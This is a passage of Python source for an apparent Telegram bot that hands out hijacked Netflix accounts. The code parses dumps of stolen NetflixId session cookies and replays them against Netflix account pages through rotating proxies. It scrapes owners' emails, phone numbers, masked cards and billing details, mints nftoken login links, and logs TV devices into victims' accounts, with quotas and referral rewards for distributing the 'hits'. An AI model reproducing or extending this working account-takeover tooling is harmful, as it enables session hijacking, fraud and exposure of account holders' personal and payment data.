                cookies[name] = parts[6]
    if cookies.get('NetflixId'):
        return cookies

    for cn in ('NetflixId', 'SecureNetflixId', 'nfvdid', 'OptanonConsent'):
        m = re.search(rf'{cn}\s*[:=]\s*([^\s;,\n"\']+)', content, re.IGNORECASE)
        if m:
            cookies[cn] = m.group(1).strip('"\'')
    return cookies if cookies.get('NetflixId') else None

MAX_TV_ATTEMPTS = 50

def process_tv_login_from_pool(tv_code, progress_callback=None, loop=None):
    try:
        basic, standard, premium = asyncio.run_coroutine_threadsafe(get_pool_cached(), loop).result()
        nids = premium[:]
    except:
        if not os.path.exists(PREMIUM_FILE):
            return {"success": False, "error": "Premium pool file not found."}
        nids = read_plan_file(PREMIUM_FILE)

    if not nids:
        return {"success": False, "error": "No premium cookies in pool."}

    used = load_used()
    random.shuffle(nids)
    tried_countries = []
    used_nids = set()
    total = len(nids)
    tried = 0
    working_cookie_nid = None

    for nid in nids:
        if tried >= MAX_TV_ATTEMPTS:
            break
        if nid in used or nid in used_nids:
            continue
        used_nids.add(nid)
        tried += 1
        if progress_callback and loop:
            asyncio.run_coroutine_threadsafe(
                progress_callback(tried, min(total, MAX_TV_ATTEMPTS), nid),
                loop
            )
        try:
            cookies, info = generator.get_cookies_and_info(nid)
            if not cookies:
                continue
            if info.get('membershipStatus', '').upper() == 'INACTIVE':
                used.add(nid)
                save_used(used)
                continue
            if is_on_hold_account(info):
                used.add(nid)
                save_used(used)
                continue
            proxy_str = random.choice(list(proxy_manager.proxies)) if proxy_manager.proxies else None
            proxy_dict = parse_proxy_line(proxy_str) if proxy_str else None
            valid, country, plan_name = validate_cookie_tv(cookies, proxy_dict)
            if not valid:
                used.add(nid)
                save_used(used)
                continue
            if country:
                tried_countries.append(country)
            with requests.Session() as session:
                session.cookies.update(cookies)
                result = submit_tv_code(session, tv_code, proxy_dict)
            if result.get("error") == "INVALID_CODE":
                return {"success": False, "error": "Invalid or expired TV code", "country": country}
            result["country"] = country
            result["plan"] = plan_name
            result["tried_countries"] = tried_countries
            if result["success"]:
                working_cookie_nid = nid
                used.add(nid)
                save_used(used)
                result["nid"] = nid
                result["email"] = info.get('email', '')
                return result
            if "Invalid" in str(result.get("error", "")) or "expired" in str(result.get("error", "")).lower():
                used.add(nid)
                save_used(used)
                return result
        except Exception as e:
            log.error(f"TV login error for cookie {nid}: {e}")
            used.add(nid)
            save_used(used)
            continue
    return {"success": False, "error": "all_cookies_failed", "tried_countries": tried_countries}

# ========== JSON HELPERS ==========
def load_json(file, default):
    if os.path.exists(file):
        try:
            with open(file, 'r', encoding='utf-8') as f:
                return json.load(f)
        except (json.JSONDecodeError, IOError):
            log.warning(f"Corrupt JSON file {file}, using default")
            return default
    return default

def save_json(file, data):
    tmp = file + ".tmp"
    try:
        with open(tmp, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2)
        os.replace(tmp, file)
    except Exception as e:
        log.error(f"Failed to save {file}: {e}")

def load_users():
    with users_file_lock:
        return load_json(USERS_FILE, {})

def save_users(users):
    with users_file_lock:
        save_json(USERS_FILE, users)

def load_keys():
    with keys_file_lock:
        return load_json(KEYS_FILE, {})

def save_keys(keys):
    with keys_file_lock:
        save_json(KEYS_FILE, keys)

def load_used():
    with used_file_lock:
        return set(load_json(USED_FILE, []))

def save_used(used):
    with used_file_lock:
        save_json(USED_FILE, list(used))

# ========== USER MANAGEMENT ==========
def ensure_user(user_id: str, username: str = None) -> Tuple[Dict, Dict]:
    users = load_users()
    today = datetime.now().strftime("%Y-%m-%d")
    if user_id not in users:
        users[user_id] = {
            "last_claim_date": today,
            "last_check_date": today,
            "premium_expiry": 0,
            "premium_check_quota": 0,
            "premium_get_quota": 0,
            "is_admin": user_id in [str(a) for a in ADMIN_IDS] or int(user_id) in ADMIN_IDS,
            "pending_premium": 0,
            "referral_count": 0,
            "claimed_total": 0,
            "claimed_basic_today": 0,
            "claimed_standard_today": 0,
            "claimed_premium_today": 0,
            "checks_today": 0,
            "mass_checked_cookies_today": 0,
            "joined_channels": False,
            "referred_by": None,
            "banned": False,
            "ban_reason": "",
            "username": username or "",
        }
    else:
        user = users[user_id]
        if user.get("last_claim_date") != today:
            user["last_claim_date"] = today
            user["claimed_basic_today"] = 0
            user["claimed_standard_today"] = 0
            user["claimed_premium_today"] = 0
        if user.get("last_check_date") != today:
            user["last_check_date"] = today
            user["checks_today"] = 0
            user["mass_checked_cookies_today"] = 0
        user["is_admin"] = user_id in [str(a) for a in ADMIN_IDS] or int(user_id) in ADMIN_IDS
        defaults = {
            "premium_expiry": 0,
            "premium_check_quota": 0,
            "premium_get_quota": 0,
            "pending_premium": 0,
            "referral_count": 0,
            "claimed_total": 0,
            "claimed_basic_today": 0,
            "claimed_standard_today": 0,
            "claimed_premium_today": 0,
            "checks_today": 0,
            "mass_checked_cookies_today": 0,
            "joined_channels": False,
            "referred_by": None,
            "banned": False,
            "ban_reason": "",
            "username": username or "",
        }
        for k, v in defaults.items():
            if k not in user:
                user[k] = v
            elif k == "username" and username and user.get("username") != username:
                user["username"] = username
    save_users(users)
    return users, users[user_id]

def is_premium(user: Dict) -> bool:
    expiry = user.get("premium_expiry", 0)
    if expiry > time.time():
        if user.get("premium_check_quota", 0) > 0 or user.get("premium_get_quota", 0) > 0:
            return True
    return False

def get_user_display(user_id: str, username: Optional[str] = None) -> str:
    if username:
        return f"@{username}"
    return f'<a href="tg://user?id={user_id}">{user_id}</a>'

async def require_not_banned(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    if not update.effective_user:
        return False
    user_id = str(update.effective_user.id)
    users, user = ensure_user(user_id, update.effective_user.username)
    if user.get("banned", False):
        reason = user.get("ban_reason", "No reason provided")
        await update.effective_message.reply_text(
            premium_emoji(f"⛔ You are **banned** from using this bot.\nReason: {reason}\nContact admin if you think this is a mistake."),
            parse_mode='HTML'
        )
        return False
    return True

def set_pending_feedback(user_id: str, feedback_type: str, cookie_nid: str, plan: str = "", email: str = "", username: str = None):
    users, user = ensure_user(user_id, username)
    user["pending_feedback"] = {
        "type": feedback_type,
        "cookie": cookie_nid,
        "email": email,
        "timestamp": time.time(),
        "plan": plan,
        "notified": False
    }
    save_users(users)

def get_pending_feedback(user_id: str) -> Optional[Dict]:
    users, user = ensure_user(user_id)
    return user.get("pending_feedback")

def clear_pending_feedback(user_id: str):
    users, user = ensure_user(user_id)
    user.pop("pending_feedback", None)
    save_users(users)

def has_pending_feedback(user_id: str) -> bool:
    pf = get_pending_feedback(user_id)
    return bool(pf)

async def require_no_pending_feedback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    if not update.effective_user:
        return False
    user_id = str(update.effective_user.id)
    users, user = ensure_user(user_id, update.effective_user.username)
    if user.get("is_admin", False):
        return True
    if has_pending_feedback(user_id):
        pending = get_pending_feedback(user_id)
        await update.effective_message.reply_text(
            premium_emoji(f"⛔ You have a pending screenshot request from your last `{pending['type']}` command.\n"
                          f"Please send the screenshot **now** to continue using most commands.\n"
                          f"(Only `/nfcheck` is available while pending.)\n"
                          f"Your request does not expire – you must send the screenshot to unblock."),
            parse_mode='HTML'
        )
        return False
    return True

async def feedback_timeout_checker(bot):
    admin_id = 6725209689   # hardcoded to your ID
    while True:
        await asyncio.sleep(60)
        try:
            users = load_users()
            now = time.time()
            for uid, user in users.items():
                pf = user.get("pending_feedback")
                if not pf:
                    continue

                elapsed = now - pf["timestamp"]

                if AUTOBAN_ENABLED and elapsed >= (AUTOBAN_TIMEOUT_MINUTES * 60):
                    user["banned"] = True
                    user["ban_reason"] = f"Auto-banned for not sending feedback within {AUTOBAN_TIMEOUT_MINUTES} minutes."
                    user.pop("pending_feedback", None)
                    save_users(users)
                    log.info(f"Auto-banned user {uid} for feedback timeout.")

                    username = user.get("username", "N/A")
                    display = get_user_display(uid, username)

                    try:
                        await bot.send_message(
                            chat_id=admin_id,
                            text=f"⛔ Auto-banned user {display} (`{uid}`) for not sending feedback within {AUTOBAN_TIMEOUT_MINUTES} minutes.",
                            parse_mode='HTML'
                        )
                    except Exception:
                        pass

                    try:
                        await bot.send_message(
                            chat_id=int(uid),
                            text=premium_emoji(
                                f"⛔ You have been **auto-banned** for not sending a screenshot within {AUTOBAN_TIMEOUT_MINUTES} minutes.\n"
                                f"Reason: {user['ban_reason']}\n"
                                f"Contact admin if you think this is a mistake."
                            ),
                            parse_mode='HTML'
                        )
                    except Exception as e:
                        log.error(f"Could not notify user {uid} of auto-ban: {e}")
                    continue

                if not AUTOBAN_ENABLED and not pf.get("notified", False) and elapsed >= 300:
                    username = user.get("username", "N/A")
                    display = get_user_display(uid, username)
                    msg = (
                        f"⏰ <b>Feedback Pending (5+ minutes)</b>\n"
                        f"User: {display}\n"
                        f"Command: <code>{pf['type']}</code>\n"
                        f"Plan: <code>{pf.get('plan', 'N/A')}</code>\n"
                        f"Pending since: {datetime.fromtimestamp(pf['timestamp']).isoformat()}\n"
                        f"<b>They have not sent a screenshot yet.</b>"
                    )
                    try:
                        await bot.send_message(chat_id=admin_id, text=msg, parse_mode='HTML')
                        pf["notified"] = True
                        save_users(users)
                    except Exception as e:
                        log.error(f"Failed to send to admin: {e}")
        except Exception as e:
            log.error(f"Error in feedback_timeout_checker: {e}")

def grant_referral_reward(user_id: str, users: dict) -> bool:
    user = users.get(user_id)
    if not user:
        return False
    pending = user.get("pending_premium", 0)
    if pending <= 0:
        return False
    user["pending_premium"] = pending - 1
    current_expiry = user.get("premium_expiry", 0)
    new_expiry = max(current_expiry, time.time()) + REFERRAL_REWARD_HOURS * 3600
    user["premium_expiry"] = new_expiry
    user["premium_check_quota"] = user.get("premium_check_quota", 0) + REFERRAL_REWARD_CHECK_QUOTA
    user["premium_get_quota"] = user.get("premium_get_quota", 0) + REFERRAL_REWARD_GET_QUOTA
    return True

def clean_text(text):
    if not text:
        return 'N/A'
    try:
        text = html_mod.unescape(text)
        text = codecs.decode(text, 'unicode_escape')
        text = text.replace('\u00A0', ' ')
        text = ''.join(c for c in text if c != '\x00')
        return text.strip() or 'N/A'
    except Exception:
        return 'N/A'

def safe_html(text):
    if not text:
        return "Unknown"
    text = clean_text(str(text))
    text = html_mod.escape(text)
    return text

def scrub_text(text: str) -> str:
    if not text:
        return "Unknown"
    text = safe_html(text)
    text = re.sub(r'([A-Za-z0-9._%+-]{2})[A-Za-z0-9._%+-]*(@[A-Za-z0-9.-]+\.[A-Za-z]{2,})', r'\1***\2', text)
    text = re.sub(r'(\+?\d{2})\d{2,}(\d{2})', r'\1******\2', text)
    return text

def dict_to_netscape(cookie_dict, domain=".netflix.com"):
    expiry = int(time.time()) + 180 * 24 * 3600
    lines = ["# Netscape HTTP Cookie File"]
    for k, v in cookie_dict.items():
        secure = "TRUE" if k in ("SecureNetflixId", "SecureNetflixId") else "FALSE"
        lines.append(f"{domain}\tTRUE\t/\t{secure}\t{expiry}\t{k}\t{v}")
    return "\n".join(lines)

def safe_filename(name):
    return re.sub(r'[^a-zA-Z0-9_\-\.]', '_', name)

def translate_date(date_str):
    if not date_str or date_str in ['Not available', 'N/A', 'null', '']:
        return date_str
    return date_str

# ========== COOKIE PARSING ==========
def extract_netflix_cookies(text: str) -> List[Dict[str, str]]:
    tokens = set()
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        if line.startswith("#") and not line.startswith("#HttpOnly_"):
            continue
        if line.startswith("#HttpOnly_"):
            line = line[len("#HttpOnly_"):]
        parts = line.split("\t")
        if len(parts) >= 7:
            name = parts[5].strip()
            if name.lower() == "netflixid":
                value = parts[6].strip()
                cleaned = extract_netflix_id(value)
                if cleaned:
                    tokens.add(cleaned)

    for match in re.finditer(r'NetflixId\s*[:=]\s*([^\s;,\n"\']+)', text, re.IGNORECASE):
        raw = match.group(1).strip()
        cleaned = extract_netflix_id(raw)
        if cleaned:
            tokens.add(cleaned)

    for match in re.finditer(r'ct=([^\s;,\n"\']+)', text, re.IGNORECASE):
        raw = match.group(1).strip()
        token = 'ct=' + raw
        cleaned = extract_netflix_id(token)
        if cleaned:
            tokens.add(cleaned)

    try:
        data = json.loads(text)
        if isinstance(data, dict):
            data = data.get('cookies') or data.get('items') or [data]
        if isinstance(data, list):
            for item in data:
                if isinstance(item, dict):
                    name = item.get('name', '')
                    if name.lower() == 'netflixid':
                        raw = item.get('value', '')
                        cleaned = extract_netflix_id(raw)
                        if cleaned:
                            tokens.add(cleaned)
    except:
        pass

    if not tokens:
        for line in text.splitlines():
            line = line.strip()
            if not line:
                continue
            cleaned = extract_netflix_id(line)
            if cleaned:
                tokens.add(cleaned)

    return [{"NetflixId": t} for t in tokens if t]

def extract_netscape_lines(content: str) -> str:
    lines = content.splitlines()
    cookie_lines = []
    for line in lines:
        line = line.strip()
        if not line:
            continue
        parts = line.split('\t')
        if len(parts) >= 7:
            if '.' in parts[0] or parts[0] == 'localhost':
                cookie_lines.append(line)
    return '\n'.join(cookie_lines)

def split_txt_by_token(content: str) -> List[str]:
    lines = content.splitlines()
    token_indices = []
    for i, line in enumerate(lines):
        if 'NetflixId=' in line or 'ct=' in line:
            token_indices.append(i)
    if not token_indices:
        return [content]
    blocks = []
    for idx, start in enumerate(token_indices):
        end = token_indices[idx+1] if idx+1 < len(token_indices) else len(lines)
        block_lines = lines[start:end]
        block = '\n'.join(block_lines)
        blocks.append(block)
    return blocks

def parse_cookie_file(text):
    return extract_netflix_cookies(text)

async def extract_cookies_from_zip(zip_path):
    cookies = []
    with zipfile.ZipFile(zip_path, 'r') as z:
        for info in z.infolist():
            if info.is_dir():
                continue
            if info.filename.startswith('__MACOSX') or info.filename.startswith('.'):
                continue
            if info.filename.lower().endswith(('.txt', '.json')):
                with z.open(info) as f:
                    try:
                        content = f.read().decode('utf-8', errors='ignore')
                        c = parse_cookie_file(content)
                        for cookie in c:
                            cookies.append((f"{safe_filename(info.filename)}", cookie))
                    except:
                        continue
    return cookies

# ========== NETFLIX TOKEN GENERATOR ==========
class NetflixTokenGenerator:
    def __init__(self):
        self.session_headers = {
            'User-Agent': get_random_user_agent(),
            'Accept': 'text/html,application/xhtml+xml',
            'Accept-Language': 'en-US,en;q=0.9',
        }

    def extract_netflix_id(self, raw_cookie: str) -> Optional[str]:
        return extract_netflix_id(raw_cookie)

    def _extract_initial_state(self, html: str) -> Optional[Dict]:
        pattern = r'<script[^>]*>window\.__INITIAL_STATE__\s*=\s*({.*?});\s*</script>'
        match = re.search(pattern, html, re.DOTALL)
        if not match:
            return None
        try:
            return json.loads(match.group(1))
        except:
            return None

    def _extract_account_info_fallback(self, html_content: str) -> Dict:
        info = {}

        def find(pattern):
            m = re.search(pattern, html_content, re.IGNORECASE | re.DOTALL)
            return m.group(1).strip() if m else None

        info['accountOwnerName'] = find(r'"accountOwnerName"\s*:\s*"([^"]+)"') or find(r'"firstName"\s*:\s*"([^"]+)"')
        info['email'] = find(r'"emailAddress"\s*:\s*"([^"]+)"') or find(r'"email"\s*:\s*"([^"]+)"')
        info['countryOfSignup'] = find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or find(r'"currentCountry"\s*:\s*"([^"]+)"') or find(r'"countryCode"\s*:\s*"([^"]+)"')
        info['memberSince'] = find(r'"memberSince"\s*:\s*"([^"]+)"')
        info['nextBillingDate'] = find(r'"nextBillingDate":\{[^}]*"date":"([^T"]+)"') or find(r'"nextBilling"[^}]*"value":"([^"]+)"')
        info['userGuid'] = find(r'"userGuid"\s*:\s*"([^"]+)"') or find(r'"ownerGuid"\s*:\s*"([^"]+)"')
        info['membershipStatus'] = find(r'"membershipStatus"\s*:\s*"([^"]+)"')
        info['localizedPlanName'] = find(r'localizedPlanName".*?"value":"([^"]+)"') or find(r'"planName"\s*:\s*"([^"]+)"')
        info['planPrice'] = find(r'"planPrice":\{[^}]*"value":"([^"]+)"') or find(r'"formattedPlanPrice"\s*:\s*"([^"]+)"')
        info['paymentMethodType'] = find(r'"paymentMethod":\{[^}]*"value":"([^"]+)"') or find(r'"paymentMethodType"\s*:\s*"([^"]+)"')
        info['maskedCard'] = find(r'"paymentCardDisplayString"\s*:\s*"([^"]+)"') or find(r'"displayText"\s*:\s*"([^"]+)"')
        info['phoneNumber'] = find(r'"phoneNumberDigits":\{[^}]*"value":"([^"]+)"') or find(r'"phoneNumber"\s*:\s*"([^"]+)"')
        info['videoQuality'] = find(r'"videoQuality":\{[^}]*"value":"([^"]+)"') or find(r'"maxVideoQuality"\s*:\s*"([^"]+)"')
        info['maxStreams'] = find(r'"maxStreams":\{[^}]*"value":([0-9]+)') or find(r'"maxStreams"\s*:\s*"?([0-9]+)"?')
        info['holdStatus'] = format_boolean_label(re.search(r'"isUserOnHold":\s*(true|false)', html_content, re.IGNORECASE).group(1) if re.search(r'"isUserOnHold":\s*(true|false)', html_content, re.IGNORECASE) else None)
        info['emailVerified'] = format_boolean_label(re.search(r'"emailVerified":\s*(true|false)', html_content, re.IGNORECASE).group(1) if re.search(r'"emailVerified":\s*(true|false)', html_content, re.IGNORECASE) else None)
        info['phoneVerified'] = format_boolean_label(re.search(r'"phoneVerified":\s*(true|false)', html_content, re.IGNORECASE).group(1) if re.search(r'"phoneVerified":\s*(true|false)', html_content, re.IGNORECASE) else None)

        profiles = re.findall(r'"profileName"\s*:\s*"([^"]+)"', html_content)
        if not profiles:
            profiles = re.findall(r'"displayName"\s*:\s*"([^"]+)"', html_content)
        info['profiles'] = ", ".join(profiles[:5]) if profiles else None

        # ---- Only mark as restart if plan is missing ----
        plan = info.get('localizedPlanName')
        if not plan or plan in ('N/A', 'Unknown', 'null', ''):
            if is_restart_page(html_content):
                info['membershipStatus'] = 'INACTIVE'
                info['holdStatus'] = 'Yes'

        return {k: v for k, v in info.items() if v not in (None, "", [], {})}

    def extract_account_info(self, html_content: str) -> Dict:
        graphql_info = extract_info_from_graphql_payload(html_content)
        if graphql_info and graphql_info.get('email') and graphql_info.get('countryOfSignup'):
            # Only apply restart detection if plan is missing
            plan = graphql_info.get('localizedPlanName')
            if (not plan or plan in ('N/A', 'Unknown', 'null', '')) and is_restart_page(html_content):
                graphql_info['membershipStatus'] = 'INACTIVE'
                graphql_info['holdStatus'] = 'Yes'
            return graphql_info

        fallback_info = self._extract_account_info_fallback(html_content)
        merged = dict(fallback_info)
        for k, v in graphql_info.items():
            if v not in (None, "", [], {}):
                merged[k] = v
        # Re-apply restart condition (plan missing)
        plan = merged.get('localizedPlanName')
        if (not plan or plan in ('N/A', 'Unknown', 'null', '')) and is_restart_page(html_content):
            merged['membershipStatus'] = 'INACTIVE'
            merged['holdStatus'] = 'Yes'
        return merged

    def get_cookies_and_info(self, netflix_id: str, retries: int = 4, proxy: Optional[dict] = None) -> Tuple[Optional[Dict[str, str]], Dict]:
        for attempt in range(retries):
            try:
                with requests.Session() as session:
                    session.headers.update(self.session_headers)
                    session.headers['User-Agent'] = get_random_user_agent()
                    if proxy:
                        session.proxies.update(proxy)
                    session.cookies.set('NetflixId', netflix_id, domain='.netflix.com')
                    urls = [
                        "https://www.netflix.com/YourAccount",
                        "https://www.netflix.com/account",
                        "https://www.netflix.com/account/membership",
                    ]
                    response = None
                    for url in urls:
                        try:
                            resp = session.get(url, timeout=REQUEST_TIMEOUT, allow_redirects=True, verify=False)
                            if resp.status_code == 200 and ('Account' in resp.text or 'membershipStatus' in resp.text):
                                response = resp
                                break
                        except:
                            continue
                    if not response:
                        if attempt < retries - 1:
                            time.sleep(2 * (attempt + 1))
                            continue
                        return None, {'reason': 'No response from Netflix after retries'}
                    if 'login' in response.url.lower() or 'signin' in response.url.lower():
                        return None, {'reason': 'Redirected to login (cookie expired or invalid)'}
                    account_info = self.extract_account_info(response.text)
                    cookies = {c.name: c.value for c in session.cookies}

                    if not account_info.get('email') and not account_info.get('countryOfSignup'):
                        return None, {'reason': 'No account data found (inactive or invalid)'}

                    return cookies, account_info
            except requests.exceptions.Timeout:
                if attempt < retries - 1:
                    time.sleep(2 * (attempt + 1))
                    continue
                return None, {'reason': f'Request timeout after {retries} attempts'}
            except Exception as e:
                if attempt < retries - 1:
                    time.sleep(2 * (attempt + 1))
                    continue
                return None, {'reason': f'Exception: {str(e)[:100]}'}
        return None, {'reason': 'Unknown error'}

    def verify_cookie(self, netflix_id: str, proxy: Optional[dict] = None) -> Tuple[bool, Dict]:
        cookies, info = self.get_cookies_and_info(netflix_id, proxy=proxy)
        if not cookies:
            return False, info

        if not info.get('email') and not info.get('countryOfSignup') and not info.get('localizedPlanName'):
            return False, {'reason': 'No account data found (inactive or invalid)'}

        if info.get('membershipStatus') and info['membershipStatus'].upper() == 'INACTIVE':
            return False, {'reason': 'Account inactive', 'membership_status': 'INACTIVE'}

        if is_on_hold_account(info):
            return False, {'reason': 'Account on hold', 'hold': 'Yes'}

        token_data, err = generate_nftoken(cookies)
        if token_data and token_data.get('token'):
            info['_token'] = token_data['token']
            info['_token_expires'] = token_data.get('expires', 'Unknown')
            if validate_token(token_data['token']):
                return True, info
            else:
                info['_token_issue'] = 'Token generation failed validation'
                return True, info
        else:
            return False, {'reason': f'Token generation failed: {err}', '_token_issue': err}

    def generate_nftoken(self, cookies: Dict[str, str], retries: int = 1) -> Optional[str]:
        token_data, _ = generate_nftoken(cookies)
        if token_data:
            return token_data.get('token')
        return None

generator = NetflixTokenGenerator()

# ========== TOKEN CACHE ==========
async def get_cached_token(netflix_id: str) -> Optional[str]:
    await cleanup_token_cache()
    async with TOKEN_CACHE_LOCK:
        if netflix_id in TOKEN_CACHE:
            token, expires = TOKEN_CACHE[netflix_id]
            if time.time() < expires:
                if validate_token(token):
                    return token
                else:
                    del TOKEN_CACHE[netflix_id]
            else:
                del TOKEN_CACHE[netflix_id]

    loop = asyncio.get_running_loop()
    token = await loop.run_in_executor(GLOBAL_EXECUTOR, get_fresh_token, netflix_id)
    if token:
        async with TOKEN_CACHE_LOCK:
            if len(TOKEN_CACHE) >= TOKEN_CACHE_MAX_SIZE:
                sorted_items = sorted(TOKEN_CACHE.items(), key=lambda x: x[1][1])
                for k, _ in sorted_items[:len(TOKEN_CACHE) - TOKEN_CACHE_MAX_SIZE + 1]:
                    del TOKEN_CACHE[k]
            TOKEN_CACHE[netflix_id] = (token, time.time() + TOKEN_CACHE_TTL)
    return token

def get_fresh_token(netflix_id: str) -> Optional[str]:
    try:
        cookies, _ = generator.get_cookies_and_info(netflix_id)
        if cookies:
            token_data, _ = generate_nftoken(cookies)
            if token_data:
                return token_data.get('token')
    except Exception:
        pass
    return None

# ========== WRAPPER ==========
def verify_cookie_wrapper(nid, proxy):
    max_attempts = 2
    base_delay = 2
    last_error = None
    for attempt in range(max_attempts):
        try:
            valid, info = generator.verify_cookie(nid, proxy=proxy)
            if not valid:
                if info.get('membership_status') == 'INACTIVE' or info.get('reason', '').startswith('Account'):
                    return {'ok': False, 'reason': info.get('reason', 'Account inactive'), 'cookie': {'NetflixId': nid}}
                last_error = info.get('reason', 'Unknown error')
                if attempt < max_attempts - 1:
                    time.sleep(base_delay * (attempt + 1))
                    continue
                else:
                    return {'ok': False, 'reason': f'Failed after retries: {last_error}', 'cookie': {'NetflixId': nid}}
            result = {
                'ok': True,
                'premium': is_subscribed_account(info),
                'name': info.get('accountOwnerName', 'Unknown'),
                'country': info.get('countryOfSignup', 'Unknown'),
                'plan': info.get('localizedPlanName', 'Unknown'),
                'plan_price': info.get('planPrice', 'Unknown'),
                'member_since': info.get('memberSince', 'Unknown'),
                'next_billing': info.get('nextBillingDate', 'Unknown'),
                'payment_method': info.get('paymentMethodType', 'Unknown'),
                'masked_card': info.get('maskedCard', 'Unknown'),
                'phone': info.get('phoneNumber', 'Unknown'),
                'phone_verified': info.get('phoneVerified', 'Unknown'),
                'video_quality': info.get('videoQuality', 'Unknown'),
                'max_streams': info.get('maxStreams', 'Unknown'),
                'on_payment_hold': format_boolean_label(info.get('holdStatus')) or 'No',
                'extra_member': info.get('showExtraMemberSection', 'Unknown'),
                'email_verified': info.get('emailVerified', 'Unknown'),
                'email': info.get('email', 'Unknown'),
                'profiles': info.get('profiles', 'Unknown'),
                'user_guid': info.get('userGuid', 'Unknown'),
                'membership_status': info.get('membershipStatus', 'Unknown'),
                'cookie': {'NetflixId': nid},
                '_token': info.get('_token', None),
                '_token_issue': info.get('_token_issue', None)
            }
            return result
        except Exception as e:
            last_error = str(e)
            if attempt < max_attempts - 1:
                time.sleep(base_delay * (attempt + 1))
                continue
    return {'ok': False, 'reason': f'Max retries exceeded: {last_error}', 'cookie': {'NetflixId': nid}}

# ========== EXPORT STRING ==========
def build_export_str(dd, idx):
    d = [f"========== HIT #{idx} =========="]
    cookie = dd.get('cookie', {})
    token = dd.get('_token')
    login_link = f"https://netflix.com/?nftoken={token}" if token else "N/A"

    for key, label in [('name','Name'),('email','Email'),('country','Country'),
                        ('plan','Plan'),('plan_price','Plan Price'),('member_since','Member Since'),
                        ('next_billing','Next Billing'),('payment_method','Payment'),('masked_card','Card'),
                        ('phone','Phone'),('phone_verified','Phone Verified'),('email_verified','Email Verified'),
                        ('video_quality','Quality'),('max_streams','Streams'),('on_payment_hold','On Hold'),
                        ('extra_member','Extra Member'),('membership_status','Status'),('profiles','Profiles'),
                        ('user_guid','GUID')]:
        val = dd.get(key, 'Unknown')
        val = clean_text(val)
        # Format country with flag, dates with proper formatting
        if key == 'country':
            val = format_country_with_flag(val)
        elif key == 'member_since':
            val = format_member_since(val)
        elif key == 'next_billing':
            val = format_display_date(val)
        d.append(f"{label}: {safe_html(val)}")
    cd = dd.get('cookie', {})
    ns = dict_to_netscape(cd) if isinstance(cd, dict) else str(cd)
    d.append(f"Login Link: {login_link}")
    return "\n".join(d) + "\n\nNetscape Cookie ↓\n" + ns + f"\n\n{WATERMARK}"

# ========== OUTPUT FORMATTER ==========
def format_output(token: str, info: Dict, netflix_id: str) -> str:
    email = clean_text(info.get('email', 'N/A'))
    plan = clean_text(info.get('localizedPlanName', 'N/A'))
    country = clean_text(info.get('countryOfSignup', 'N/A'))
    country_display = format_country_with_flag(country)
    billing = format_display_date(info.get('nextBillingDate', 'N/A'))
    streams = clean_text(info.get('maxStreams', 'Unknown'))
    quality = clean_text(info.get('videoQuality', 'Unknown'))
    payment = clean_text(info.get('paymentMethodType', 'Unknown'))
    phone = clean_text(info.get('phoneNumber', 'Not linked'))
    hold = format_boolean_label(info.get('holdStatus')) or 'Unknown'
    price = clean_text(info.get('planPrice', 'N/A'))
    member_since = format_member_since(info.get('memberSince'))
    login_link = f"https://netflix.com/?nftoken={token}" if token else "N/A"

    return f"""
📺 Netflix Bot 📺
━━━━━━━━━━━━━━━━━━━━━━━━━
🆔 NetflixId:
<code>{netflix_id}</code>

🔑 Login Link:
<code>{login_link}</code>

📧 Email: {email}
💳 Plan: {plan}
💰 Price: {price}
🌍 Country: {country_display}
📅 Member Since: {member_since}
📆 Next Billing: {billing}
📺 Streams: {streams}
🎬 Quality: {quality}
💳 Payment: {payment}
📱 Phone: {phone}
⏸️ Hold: {hold}
━━━━━━━━━━━━━━━━━━━━━━━━━
"""

# ========== BOT COMMANDS ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user:
        return
    user_id = str(update.effective_user.id)
    users = load_users()
    user_is_new = user_id not in users
    users, user = ensure_user(user_id, update.effective_user.username)

    args = context.args
    pending_ref = None
    if args and args[0].startswith("ref_"):
        referrer_id = args[0].split("_")[1]
        if user_is_new and user.get("referred_by") is None and referrer_id != user_id and referrer_id in users:
            pending_ref = referrer_id
            context.user_data['pending_referral'] = referrer_id
            context.user_data['user_is_new'] = True
        else:
            if not user_is_new:
                await update.effective_message.reply_text(
                    premium_emoji("ℹ️ This referral link is only for new users. You already have an account."),
                    parse_mode='HTML'
                )
            elif user.get("referred_by") is not None:
                await update.effective_message.reply_text(
                    premium_emoji("ℹ️ You have already been referred by someone else."),
                    parse_mode='HTML'
                )
            elif referrer_id == user_id:
                await update.effective_message.reply_text(
                    premium_emoji("⚠️ You cannot refer yourself."),
                    parse_mode='HTML'
                )
            else:
                await update.effective_message.reply_text(
                    premium_emoji("⚠️ Invalid referral link or referrer not found."),
                    parse_mode='HTML'
                )
            context.user_data.pop('pending_referral', None)
            context.user_data.pop('user_is_new', None)

    if not await require_join(update, context):
        return

    if pending_ref:
        referrer_id = pending_ref
        if user.get("referred_by") is None and referrer_id != user_id and referrer_id in users:
            user["referred_by"] = referrer_id
            referrer = users[referrer_id]
            referrer["pending_premium"] = referrer.get("pending_premium", 0) + 1
            referrer["referral_count"] = referrer.get("referral_count", 0) + 1
            save_users(users)
            try:
                await context.bot.send_message(
                    chat_id=int(referrer_id),
                    text=premium_emoji("🎉 You got a new referral! +1 Premium cookie earned. Use /claim to get it."),
                    parse_mode='HTML'
                )
            except Exception:
                pass
            await update.effective_message.reply_text(
                premium_emoji("✅ Referral recorded! Your referrer earned a Premium cookie. They can claim it with /claim."),
                parse_mode='HTML'
            )
        else:
            if user.get("referred_by") is not None:
                await update.effective_message.reply_text(
                    premium_emoji("ℹ️ You have already been referred by someone else."),
                    parse_mode='HTML'
                )
            elif referrer_id == user_id:
                await update.effective_message.reply_text(
                    premium_emoji("⚠️ You cannot refer yourself."),
                    parse_mode='HTML'
                )
            else:
                await update.effective_message.reply_text(
                    premium_emoji("⚠️ Invalid referral link."),
                    parse_mode='HTML'
                )
        context.user_data.pop('pending_referral', None)

    is_prem = is_premium(user)
    is_admin = user.get("is_admin", False)
    basic_left = max(0, FREE_BASIC_LIMIT - user["claimed_basic_today"]) if not is_admin else "∞"
    standard_left = max(0, FREE_STANDARD_LIMIT - user["claimed_standard_today"]) if not is_admin else "∞"
    premium_left = max(0, FREE_PREMIUM_LIMIT - user["claimed_premium_today"]) if not is_admin else "∞"
